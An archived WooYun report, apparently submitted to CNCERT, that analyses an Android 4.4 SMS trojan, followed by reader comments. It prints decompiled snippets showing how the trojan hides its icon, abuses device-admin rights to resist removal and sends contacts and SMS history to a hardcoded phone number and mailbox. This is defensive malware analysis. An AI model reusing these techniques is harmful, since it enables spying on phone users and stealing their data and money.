{"id": 16990, "wybug_id": "wooyun-2015-0107785", "wybug_title": "黑产兼容android 4.4的蠕虫短信马出现（附受害者信息）", "wybug_corp": "cncert", "wybug_author": "路人甲", "wybug_date": "2015-04-14 11:53", "wybug_open_date": "2015-07-16 09:56", "wybug_type": "地下0day/成功的入侵事件", "wybug_level": "低", "wybug_rank_0": "1", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["黑产"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-20：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-16：\t细节向公众公开  简要描述： 高版本的Android不一定安全哦,还是要注意使用习惯.木马通过邮件发送通信录和历史短信,实时截获短信,并且可以通过短信指令控制手机.为啥这些个安全团队/厂商的壳都给木马在用了. 详细说明：  木马用了阿里的壳,脱壳比较蛋疼因为android 4.4 只有默认短信app才能收发短信,木马在服务中加入了兼容代码\n\n\n\n注意不要点这个哦.\n\n硬编码的发件邮箱\n\n入口1:主界面aa.bb.cc.dd.ClientActivity,进行如下操作: * 隐藏图标\t\t#!java\t\tgetPackageManager().setComponentEnabledSetting(getComponentName(), 2, 1);* 激活设备管理\t  \t#!java      \tIntent localIntent = new Intent(\"android.app.action.ADD_DEVICE_ADMIN\");      \tlocalIntent.putExtra(\"android.app.extra.DEVICE_ADMIN\", this.componentName);      \tlocalIntent.putExtra(\"android.app.extra.ADD_EXPLANATION\", \"\");      \tstartActivityForResult(localIntent, 20);* 启动MyService\t\t#!java\t\tstartService(new Intent(this, MyService.class));* 通过短信发送受害者设备id给18458174771\t\t#!java\t\tAssets.sendMsg(\"18458174771\", Assets.getInstallFlag(this, \"\"));* 启动MailTask,后台通过邮件发送受害者手机号+设备id(邮件标题)和通信录(邮件内容)给mmqwe1231@163.com\t\t#!java\t\tnew MailTask(\"\", this).execute(new Integer[0]) * 启动SmsTask,后台通过邮件发送受害者手机号+设备id(邮件标题)和短信历史(邮件内容)给mmqwe1231@163.com\t\t#!java\t\tnew SmsTask(\"\", this).execute(new Integer[0]); 防卸载:设备管理器\n<receiver android:name=\"com.iwawad.vaaweea00.Dx\" android:permission=\"android.permission.BIND_DEVICE_ADMIN\">\t\t\t\t\t\t<meta-data android:name=\"android.app.device_admin\" android:resource=\"@7F040000\">\t\t\t</meta-data>\t\t\t\t\t\t<intent-filter>\t\t\t\t\t\t\t\t<action android:name=\"android.app.action.DEVICE_ADMIN_ENABLED\">\t\t\t\t</action>\t\t\t\t\t\t\t</intent-filter>\t\t\t\t\t</receiver>\n入口2:开机启动广播接收器aa.bb.cc.dd.BootReceiver\n<receiver android:name=\"aa.bb.cc.dd.BootReceiver\">\t\t\t\t\t\t<intent-filter android:priority=\"2147483647\">\t\t\t\t\t\t\t\t<action android:name=\"android.intent.action.BOOT_COMPLETED\">\t\t\t</action>\t\t\t\t\t\t\t</intent-filter>\n 进行如下操作: * 启动服务com.iwawad.vaaweea00.MyService\n#!java\t\tparamContext.startService(new Intent(paramContext, MyService.class));\n * 发送监控安装短信给18458174771\n#!java\t\tSmsManager.getDefault().sendTextMessage(\"18458174771\", null, paramContext.getString(2131165186), null, null); //String为监控安装\n 后台服务:com.iwawad.vaaweea00.MyService\n\n* 对系统版本进行判断,android 4.4启动WebInterfaceActivity,用于设置成默认短信管理软件来得到\n#!java\t\tif ((String.valueOf(Build.VERSION.RELEASE).indexOf(\"4.4\") != -1) && (!Telephony.Sms.getDefaultSmsPackage(MyService.this).equals(str)))        {          Intent localIntent = new Intent(MyService.this, WebInterfaceActivity.class);          localIntent.addFlags(268435456);          MyService.this.startActivity(localIntent);        }\ndefault sms app特性已经被木马使用,之前还以为此机制加入会对短信马会有极大遏制,但是现在想想既然傻傻的安装了木马,再傻傻的设置为默认好像很正常.一种木马诞生后往往不会消亡,它会不断的演变进化,此木马就通过简单的代码顺利兼容了android4.4.入口3:短信广播接收器com.iwawad.vaaweea00.XReceiver\t\t<receiver android:name=\"com.iwawad.vaaweea00.XReceiver\" android:permission=\"android.permission.BROADCAST_SMS\"> \t\t\t<intent-filter android:priority=\"2147483647\"> //设置优先级 \t\t\t\t<action android:name=\"android.provider.Telephony.SMS_RECEIVED\">//接收短信\t\t\t\t</action> \t\t\t\t<category android:name=\"android.intent.category.DEFAULT\">\t\t\t\t</category> \t\t\t</intent-filter> \t\t\t<intent-filter> \t\t\t\t<action android:name=\"android.provider.Telephony.SMS_DELIVER\"> //4.4特性,default SMS app\t\t\t\t</action> \t\t\t</intent-filter> \t\t</receiver> ![](recevier.png)* 短信广播接收器设置最高接收优先级拦截短信,abortBroadcast();忽略短信广播.* 启动拨号界面```tel:**21*121#   **21*#   ##21#``` //貌似是测试设备有没有卡* 拦截记录收(MailTask/SmsTask)发(SendTask)短信邮件通知mmqwe1231@163.com* 短信指令控制手机:监控状态 SetupMessagesyncTask/发送指定短信 SendMessageasyncTask\n\n\n\n   漏洞证明：  一些受害者的信息\n\n\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-04-17 09:54 厂商回复： CNVD确认为移动互联网恶意代码事件，已经转报给CNCERT，按照工业和信息化部《移动互联网恶意程序监测与处置机制》流程处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-14 11:56 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  这不就是可以配合手机短信转账的木马么    \n     2015-04-14 12:02 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  这个不就是偷了支付宝钱里的木马么    \n     2015-04-14 12:02 |    \t\tan0nym0u5 \t\t\t( 普通白帽子  |\t\t\t        Rank:172 漏洞数:31        )\t\t \n  地下0day~。。我是来看如何利用的~    \n     2015-04-14 12:08 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  传说 某人 因这个利用 被株连九族了    \n     2015-04-14 12:10 |    \t\t浅蓝 \t\t\t( 普通白帽子  |\t\t\t        Rank:274 漏洞数:109        | 爱安全:www.ixsec.orgXsec社区:zone.ixse...)\t\t \n  楼下利用这个漏洞被株连九族了    \n     2015-04-14 13:07 |    \t\tNing \t\t\t( 实习白帽子  |\t\t\t        Rank:47 漏洞数:6        )\t\t \n  楼上因为和我同污被株连九族了    \n     2015-04-14 14:09 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  您好！    感谢您对CNVD的支持，请您提供测试样本并邮件vreport@cert.org.cn，以便CNVD及时处置。   祝好！    \n     2015-04-14 19:07 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  这不就是可以配合手机短信转账的木马么？ 我觉得三四线城市是重灾区    \n     2015-04-14 21:09 |    \t\t小威 \t\t\t( 普通白帽子  |\t\t\t        Rank:492 漏洞数:76        | 活到老，学到老!)\t\t \n  这个不就是截取网银帐号的木马么    \n     2015-04-14 22:16 |    \t\t大白菜 \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:19        )\t\t \n  。。不愧是黑产牛！    \n     2015-04-14 23:34 |    \t\tCode_Monkey \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:7        | Code Monkey think someday he have everyt...)\t\t \n  路人甲才是最牛逼的。    \n     2015-04-15 19:44 |    \t\tO夜莺O \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 继续为网络安全护航。)\t\t \n  大牛，你QQ多少求请教    \n     2015-04-17 10:08 |    \t\t无名 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:9        | 我是一只小菜鸟呀，伊雅伊尔哟。)\t\t \n  CCAV  看这里。。    \n     2015-04-17 10:14 |    \t\tLonely \t\t\t( 实习白帽子  |\t\t\t        Rank:72 漏洞数:27        | 人生如梦,始终都游不过当局者迷的悲哀。)\t\t \n  这不是就是盗QQ的木马么    \n     2015-04-17 11:29 |    \t\tDARKSTON \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        )\t\t \n  你好!感谢你对CNAV 的支持,请你提供测试样本并邮件229685660@qq.com,以便CNAV 及时处理,祝好!    \n     2015-04-17 16:25 |    \t\tAgeloVito \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | Just do what i love, enjoy it and try my...)\t\t \n  @DARKSTON 社工没做好啊，邮箱不行    \n     2015-04-17 21:51 |    \t\tDARKSTON \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        )\t\t \n  @AgeloVito 我每个星期改一次密码。。    \n     2015-08-29 08:38 |    \t\tRaven \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 挖洞不易，且挖且珍惜)\t\t \n  我回家种地去了。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}